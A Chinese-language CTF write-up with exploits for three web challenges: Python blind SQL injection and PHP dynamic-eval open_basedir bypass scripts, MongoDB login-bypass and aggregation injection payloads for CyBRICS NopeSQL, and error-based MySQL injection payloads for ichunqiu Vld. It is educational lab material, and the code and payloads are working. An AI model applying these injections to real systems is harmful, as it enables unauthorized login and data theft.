<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> pyotp</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://6902525d-08c5-4464-9537-eec6f904fc0a.node3.buuoj.cn/shell.php?a=%s&amp;totp=%s'</span></span><br><span class="line">totp = pyotp.TOTP(<span class="string">"GAXG24JTMZXGKZBU"</span>, digits=<span class="number">8</span>, interval=<span class="number">5</span>)</span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line">length = <span class="number">0</span></span><br><span class="line">left = <span class="number">0x0</span></span><br><span class="line">right = <span class="number">0xff</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    mid = int((right - left) / <span class="number">2</span> + left)</span><br><span class="line">    <span class="keyword">if</span> mid == left:</span><br><span class="line">        length = mid</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    username = <span class="string">"'/**/or/**/if(length((select/**/password/**/from/**/users/**/limit/**/1))&gt;=%d,1,0)#"</span> % mid</span><br><span class="line">    password = <span class="string">"b"</span></span><br><span class="line">    payload = <span class="string">'login %s %s'</span> % (username, password)</span><br><span class="line">    payload = urllib.quote(payload)</span><br><span class="line">    payload = url % (payload, totp.now())</span><br><span class="line">    res = s.get(payload).text</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'incorrect'</span> <span class="keyword">in</span> res:</span><br><span class="line">        left = mid</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        right = mid</span><br><span class="line">print(length)</span><br><span class="line"></span><br><span class="line">real_password = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, length+<span class="number">1</span>):</span><br><span class="line">    left = <span class="number">0x20</span></span><br><span class="line">    right = <span class="number">0x7e</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        mid = int((right - left) / <span class="number">2</span> + left)</span><br><span class="line">        <span class="keyword">if</span> mid == left:</span><br><span class="line">            real_password += chr(mid)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        username = <span class="string">"'/**/or/**/if(ascii(substr((select/**/password/**/from/**/users/**/limit/**/1),%d,1))&gt;=%d,1,0)#"</span> % (i, mid)</span><br><span class="line">        password = <span class="string">"b"</span></span><br><span class="line">        payload = <span class="string">'login %s %s'</span> % (username, password)</span><br><span class="line">        payload = urllib.quote(payload)</span><br><span class="line">        payload = url % (payload, totp.now())</span><br><span class="line">        res = s.get(payload).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'incorrect'</span> <span class="keyword">in</span> res:</span><br><span class="line">            left = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right = mid</span><br><span class="line">    print(real_password)</span><br><span class="line">    <span class="keyword">if</span> len(real_password) &lt; i:</span><br><span class="line">        print(<span class="string">'No.%d char not in range'</span> % i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>得到了<code>hint{G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333}</code></p>
<p>然后<code>login admin hint{G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333} </code>来登录用户, 并且这里提示了一个命令, 执行一下sh0w_hiiintttt_23333 后提示</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">we add an evil monster named &apos;eval&apos; when launching missiles.</span><br></pre></td></tr></table></figure>
<p>其实是在提示php的动态执行特性</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> pyotp</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://6902525d-08c5-4464-9537-eec6f904fc0a.node3.buuoj.cn/shell.php?a=%s&amp;totp=%s'</span></span><br><span class="line">totp = pyotp.TOTP(<span class="string">"GAXG24JTMZXGKZBU"</span>, digits=<span class="number">8</span>, interval=<span class="number">5</span>)</span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(password)</span>:</span></span><br><span class="line">    username = <span class="string">'admin'</span></span><br><span class="line">    payload = <span class="string">'login %s %s'</span> % (username, password)</span><br><span class="line">    payload = urllib.quote(payload)</span><br><span class="line">    payload = url % (payload, totp.now())</span><br><span class="line">    s.get(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">destruct</span><span class="params">()</span>:</span></span><br><span class="line">    payload = <span class="string">'destruct'</span></span><br><span class="line">    payload = urllib.quote(payload)</span><br><span class="line">    payload = url % (payload, totp.now())</span><br><span class="line">    s.get(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">targeting</span><span class="params">(code, position)</span>:</span></span><br><span class="line">    payload = <span class="string">'targeting %s %s'</span> % (code, position)</span><br><span class="line">    payload = urllib.quote(payload)</span><br><span class="line">    payload = url % (payload, totp.now())</span><br><span class="line">    s.get(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">launch</span><span class="params">()</span>:</span></span><br><span class="line">    payload = <span class="string">'launch'</span></span><br><span class="line">    payload = urllib.quote(payload)</span><br><span class="line">    payload = url % (payload, totp.now())</span><br><span class="line">    <span class="keyword">return</span> s.get(payload).text</span><br><span class="line"></span><br><span class="line">login(<span class="string">'hint&#123;G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333&#125;'</span>)</span><br><span class="line">destruct()</span><br><span class="line">targeting(<span class="string">'a'</span>,<span class="string">'chr'</span>)</span><br><span class="line">targeting(<span class="string">'b'</span>,<span class="string">'&#123;$a(46)&#125;'</span>)</span><br><span class="line">targeting(<span class="string">'c'</span>,<span class="string">'&#123;$b&#125;&#123;$b&#125;'</span>)</span><br><span class="line">targeting(<span class="string">'d'</span>,<span class="string">'&#123;$a(47)&#125;'</span>)</span><br><span class="line">targeting(<span class="string">'e'</span>,<span class="string">'js'</span>)</span><br><span class="line">targeting(<span class="string">'f'</span>,<span class="string">'open_basedir'</span>)</span><br><span class="line">targeting(<span class="string">'g'</span>,<span class="string">'chdir'</span>)</span><br><span class="line">targeting(<span class="string">'h'</span>,<span class="string">'ini_set'</span>)</span><br><span class="line">targeting(<span class="string">'i'</span>,<span class="string">'file_get_'</span>)</span><br><span class="line">targeting(<span class="string">'j'</span>,<span class="string">'&#123;$i&#125;contents'</span>)</span><br><span class="line">targeting(<span class="string">'k'</span>,<span class="string">'&#123;$g($e)&#125;'</span>)</span><br><span class="line">targeting(<span class="string">'l'</span>,<span class="string">'&#123;$h($f,$c)&#125;'</span>)</span><br><span class="line">targeting(<span class="string">'m'</span>,<span class="string">'&#123;$g($c)&#125;'</span>)</span><br><span class="line">targeting(<span class="string">'n'</span>,<span class="string">'&#123;$h($f,$d)&#125;'</span>)</span><br><span class="line">targeting(<span class="string">'o'</span>,<span class="string">'&#123;$d&#125;flag'</span>)</span><br><span class="line">targeting(<span class="string">'p'</span>,<span class="string">'&#123;$j($o)&#125;'</span>)</span><br><span class="line">targeting(<span class="string">'q'</span>,<span class="string">'printf'</span>)</span><br><span class="line">targeting(<span class="string">'r'</span>,<span class="string">'&#123;$q($p)&#125;'</span>)</span><br><span class="line">print(launch())</span><br></pre></td></tr></table></figure>
<h2 id="CyBRICS-CTF-2019-NopeSQL">CyBRICS CTF 2019 NopeSQL</h2>
<blockquote>
<p>这道题考察mongodb注入,学到很多,复现的时候由于不会搭建环境导致都是看着payload和文档来想象解析过程的.很是菜鸡.</p>
</blockquote>
<p>开局的界面,看起来那个是登录用的框框,下面的新闻估计是随机生成的不知道啥意思.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61634032-fd035e00-acc2-11e9-8eaf-a6ff3a9fb412.png" alt="image"></p>
<p>首先发现<code>.git</code>源码泄露,如下所示:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="keyword">__DIR__</span> . <span class="string">"/vendor/autoload.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">auth</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">    $collection = (<span class="keyword">new</span> MongoDB\Client(<span class="string">'mongodb://localhost:27017/'</span>))-&gt;test-&gt;users;</span><br><span class="line">    $raw_query = <span class="string">'&#123;"username": "'</span>.$username.<span class="string">'", "password": "'</span>.$password.<span class="string">'"&#125;'</span>;</span><br><span class="line">    $document = $collection-&gt;findOne(json_decode($raw_query));</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($document) &amp;&amp; <span class="keyword">isset</span>($document-&gt;password)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user = <span class="keyword">false</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_COOKIE[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    $user = auth($_COOKIE[<span class="string">'username'</span>], $_COOKIE[<span class="string">'password'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    $user = auth($_POST[<span class="string">'username'</span>], $_POST[<span class="string">'password'</span>]);</span><br><span class="line">    <span class="keyword">if</span> ($user) &#123;</span><br><span class="line">        setcookie(<span class="string">'username'</span>, $_POST[<span class="string">'username'</span>]);</span><br><span class="line">        setcookie(<span class="string">'password'</span>, $_POST[<span class="string">'password'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span> ($user == <span class="keyword">true</span>): <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    Welcome!</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        Group most common news by</span><br><span class="line">        &lt;a href=<span class="string">"?filter=$category"</span>&gt;category&lt;/a&gt; | </span><br><span class="line">        &lt;a href=<span class="string">"?filter=$public"</span>&gt;publicity&lt;/a&gt;&lt;br&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">        $filter = $_GET[<span class="string">'filter'</span>];</span><br><span class="line"></span><br><span class="line">        $collection = (<span class="keyword">new</span> MongoDB\Client(<span class="string">'mongodb://localhost:27017/'</span>))-&gt;test-&gt;news;</span><br><span class="line"></span><br><span class="line">        $pipeline = [</span><br><span class="line">            [<span class="string">'$group'</span> =&gt; [<span class="string">'_id'</span> =&gt; <span class="string">'$category'</span>, <span class="string">'count'</span> =&gt; [<span class="string">'$sum'</span> =&gt; <span class="number">1</span>]]],</span><br><span class="line">            [<span class="string">'$sort'</span> =&gt; [<span class="string">'count'</span> =&gt; <span class="number">-1</span>]],</span><br><span class="line">            [<span class="string">'$limit'</span> =&gt; <span class="number">5</span>],</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        $filters = [</span><br><span class="line">            [<span class="string">'$project'</span> =&gt; [<span class="string">'category'</span> =&gt; $filter]]</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        $cursor = $collection-&gt;aggregate(array_merge($filters, $pipeline));</span><br><span class="line">	</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($filter)): <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="meta">&lt;?php</span></span><br><span class="line">            <span class="keyword">foreach</span> ($cursor <span class="keyword">as</span> $category) &#123;</span><br><span class="line">                    printf(<span class="string">"%s has %d news&lt;br&gt;"</span>, $category[<span class="string">'_id'</span>], $category[<span class="string">'count'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="meta">?&gt;</span></span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])): <span class="meta">?&gt;</span></span><br><span class="line">        Invalid username <span class="keyword">or</span> password</span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    &lt;form action=<span class="string">'/'</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">"text"</span> name=<span class="string">"username"</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">"password"</span> name=<span class="string">"password"</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">"submit"</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">    &lt;h2&gt;News&lt;/h2&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">        $collection = (<span class="keyword">new</span> MongoDB\Client(<span class="string">'mongodb://localhost:27017/'</span>))-&gt;test-&gt;news;</span><br><span class="line">        $cursor = $collection-&gt;find([<span class="string">'public'</span> =&gt; <span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">foreach</span> ($cursor <span class="keyword">as</span> $news) &#123;</span><br><span class="line">            printf(<span class="string">"%s&lt;br&gt;"</span>, $news[<span class="string">'title'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以看出来这是一个mongodb的注入题目,问题分为两个部分,首先是登录,这个好办,比赛的时候是构造下面的载荷来登录的(现在回头一看好多冗余.比赛的时候脑子不开窍啊…orz)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=&quot;,&quot;username&quot;:&#123;&quot;any&quot;:&quot;</span><br><span class="line">password=&quot;&#125;,&quot;password&quot;:&#123;&quot;$ne&quot;:&quot;dd&quot;&#125;,&quot;username&quot;:&quot;admin</span><br></pre></td></tr></table></figure>
<p>看一看大佬的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用户名：随便</span><br><span class="line">密码：&quot;,&quot;password&quot;:&#123;&quot;$ne&quot;: null&#125;,&quot;username&quot;:&quot;admin</span><br></pre></td></tr></table></figure>
<p>然后界面就是这样的了:</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61634710-7b143480-acc4-11e9-8a71-2458db059585.png" alt="image"></p>
<p><img src="https://user-images.githubusercontent.com/40637063/61634735-89fae700-acc4-11e9-930c-0c990671b453.png" alt="image"></p>
<p><img src="https://user-images.githubusercontent.com/40637063/61634744-91ba8b80-acc4-11e9-88ff-60e14a675ad0.png" alt="image"></p>
<p>看起来这里是分别根据类型和是否公开两个标准来呈现新闻条目的统计情况的.而且开局界面的那些新闻都筛选出来的公开的新闻,根据源码也可以看出filter是注入点(毕竟不会无缘无故给你一个功能的嘛).</p>
<p>然后不会mongodb…赛后看payload如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?filter[$cond][if][$eq][][$strLenBytes]=$title&amp;filter[$cond][if][$eq][][$toInt]=19&amp;filter[$cond][then]=$text&amp;filter[$cond][else]=12</span><br></pre></td></tr></table></figure>
<p>分析一下</p>
<p>这里的结构解析出来到代码中就类似于</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[&quot;project&quot;]=&gt; array(1) &#123; </span><br><span class="line">    [&quot;category&quot;]=&gt; array(1) &#123;</span><br><span class="line">	[&quot;$cond&quot;]=&gt; array(3) &#123;</span><br><span class="line">	    [&quot;if&quot;]=&gt; array(1) &#123;</span><br><span class="line">		[&quot;$eq&quot;]=&gt; array(2) &#123;</span><br><span class="line">		    [0]=&gt; array(1) &#123; [&quot;$strLenBytes&quot;]=&gt; string(6) &quot;$title&quot; &#125; </span><br><span class="line">		    [1]=&gt; array(1) &#123; [&quot;$toInt&quot;]=&gt; string(2) &quot;19&quot; &#125; </span><br><span class="line">		&#125; </span><br><span class="line">	    &#125; </span><br><span class="line">	    [&quot;then&quot;]=&gt; string(5) &quot;$text&quot; </span><br><span class="line">	    [&quot;else&quot;]=&gt; string(2) &quot;12&quot; </span><br><span class="line">	&#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结合代码来看</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$pipeline = [</span><br><span class="line">    [&apos;$group&apos; =&gt; [&apos;_id&apos; =&gt; &apos;$category&apos;, &apos;count&apos; =&gt; [&apos;$sum&apos; =&gt; 1]]],</span><br><span class="line">    [&apos;$sort&apos; =&gt; [&apos;count&apos; =&gt; -1]],</span><br><span class="line">    [&apos;$limit&apos; =&gt; 5],</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">$filters = [</span><br><span class="line">    [&apos;$project&apos; =&gt; [&apos;category&apos; =&gt; $filter]]</span><br><span class="line">];</span><br></pre></td></tr></table></figure>
<p>我们经过$cond筛选后得到的category会被当做_id并在下文中呈现出来.$eq $cond $strLenBytes $toInt 这些都是mongodb中的全局变量或者是数据库中的字段名,全局变量起到的是函数的作用,这段payload的意思就是首先对$title进行统计长度($strLenBytes),然后对数字19(是flag所在条目的title长度,可以一个一个数字去爆破)进行取整($toInt),最后比较他们两者是否相等($eq),如果相等,就将这个条目的$text内容赋值给category,否则,就赋值12.</p>
<p>这里有一点需要注意,mongodb中每个expression都必须被一对花括号括起来(json格式),这也解释了为什么payload中有一个空的中括号了<code>[]</code></p>
<p>参考链接:</p>
<p><a href="https://impakho.com/post/cybrics-ctf-2019-writeup?from=timeline" target="_blank" rel="noopener">https://impakho.com/post/cybrics-ctf-2019-writeup?from=timeline</a></p>
<p><a href="https://docs.mongodb.com/manual/reference/operator/aggregation/toInt/" target="_blank" rel="noopener">https://docs.mongodb.com/manual/reference/operator/aggregation/toInt/</a></p>
<p><a href="https://docs.mongodb.com/manual/reference/operator/aggregation/cond/index.html" target="_blank" rel="noopener">https://docs.mongodb.com/manual/reference/operator/aggregation/cond/index.html</a></p>
<p><a href="https://docs.mongodb.com/manual/reference/operator/aggregation/eq/" target="_blank" rel="noopener">https://docs.mongodb.com/manual/reference/operator/aggregation/eq/</a></p>
<h2 id="ichunqiu-百度杯Vld">ichunqiu 百度杯Vld</h2>
<p>关键代码<code>login.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">'dbmysql.class.php'</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">'config.inc.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'number'</span>]))&#123;</span><br><span class="line">    $db = <span class="keyword">new</span> mysql_db();</span><br><span class="line">    <span class="comment">//所谓safedata其实就是addslash</span></span><br><span class="line">    $username = $db-&gt;safe_data($_POST[<span class="string">'username'</span>]);</span><br><span class="line">    $password = $db-&gt;my_md5($_POST[<span class="string">'password'</span>]);</span><br><span class="line">    $number = is_numeric($_POST[<span class="string">'number'</span>]) ? $_POST[<span class="string">'number'</span>] : <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//注意这个诡异的替换，如果我们传入%00和一个单引号，在addslash之后会有\0\'，然后经过这个函数的替换之后成为\\'，可以实现逃逸。</span></span><br><span class="line">    $username = trim(str_replace($number, <span class="string">''</span>, $username));</span><br><span class="line"></span><br><span class="line">    $sql = <span class="string">"select * from"</span>.<span class="string">"`"</span>.table_name.<span class="string">"`"</span>.<span class="string">"where username="</span>.<span class="string">"'"</span>.<span class="string">"$username"</span>.<span class="string">"'"</span>;</span><br><span class="line">    $row = $db-&gt;query($sql);</span><br><span class="line">    $result = $db-&gt;fetch_array($row);</span><br><span class="line">    <span class="keyword">if</span>($row)&#123;</span><br><span class="line">        <span class="keyword">if</span>($result[<span class="string">"number"</span>] === $number &amp;&amp; $result[<span class="string">"password"</span>] === $password)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('nothing here!')&lt;/script&gt;"</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;script&gt;</span></span><br><span class="line"><span class="string">            alert('密码错误，老司机翻车了!');</span></span><br><span class="line"><span class="string">            function jumpurl()&#123;</span></span><br><span class="line"><span class="string">                location='login.html';</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            setTimeout('jumpurl()',1000);</span></span><br><span class="line"><span class="string">            &lt;/script&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">exit</span>(mysql_error());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;script&gt;</span></span><br><span class="line"><span class="string">            alert('用户名密码不能为空!');</span></span><br><span class="line"><span class="string">            function jumpurl()&#123;</span></span><br><span class="line"><span class="string">                location='login.html';</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            setTimeout('jumpurl()',1000);</span></span><br><span class="line"><span class="string">        &lt;/script&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">number=0&amp;username=test%00&apos; and (select 1 from (select count(*),concat( floor(rand(0)*2),database())x from information_schema.tables group by x )a) ;%23&amp;password=k&amp;submit=Submit+Query</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">number=0&amp;username=test%00&apos; and (select 1 from (select count(*),concat( floor(rand(0)*2),(select table_name from information_schema.tables where table_schema=database() limit 1))x from information_schema.tables group by x )a) ;%23 &amp;password=k&amp;submit=Submit+Query</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">number=0&amp;username=test%00&apos; and (select 1 from (select count(*),concat( floor(rand(0)*2),(select column_name from information_schema.columns where table_schema=database() limit 1))x from information_schema.tables group by x )a) ;%23 &amp;password=k&amp;submit=Submit+Query</span><br></pre></td></tr></table></figure>
